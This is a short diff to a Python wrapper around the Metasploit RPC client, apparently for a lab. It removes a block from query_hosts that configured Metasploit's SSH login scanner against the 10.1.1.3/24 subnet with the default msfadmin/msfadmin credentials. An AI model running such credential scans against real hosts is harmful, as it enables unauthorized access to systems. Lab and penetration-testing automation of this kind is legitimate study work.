@@ -39,20 +39,6 @@ class Metasploit:
             print(f"[!] Error starting msfconsole: {e}")
 
     def query_hosts(self):
-        
-        run_exploit = self.client.modules.use('auxiliary', 'scanner/ssh/ssh_login')
-        run_exploit["RHOSTS"] = '10.1.1.3/24'
-        run_exploit["USERNAME"] = 'msfadmin'
-        run_exploit["PASSWORD"] = 'msfadmin'
-        run_exploit["THREADS"] = 5 
-        print(f"Running exploit: {run_exploit} with 1 second scan...")
-        result = run_exploit.execute()
-        time.sleep(1)  # Allow time for the scan to run
-        if 'job_id' in result:
-            print("[+] Scan Complete!")
-        else:
-            print("[!] Scan failed. Retrying...")
-        
         """Retrieve all active sessions from Metasploit."""
         hosts = []
         print("Retrieving active sessions in Metasploit...")
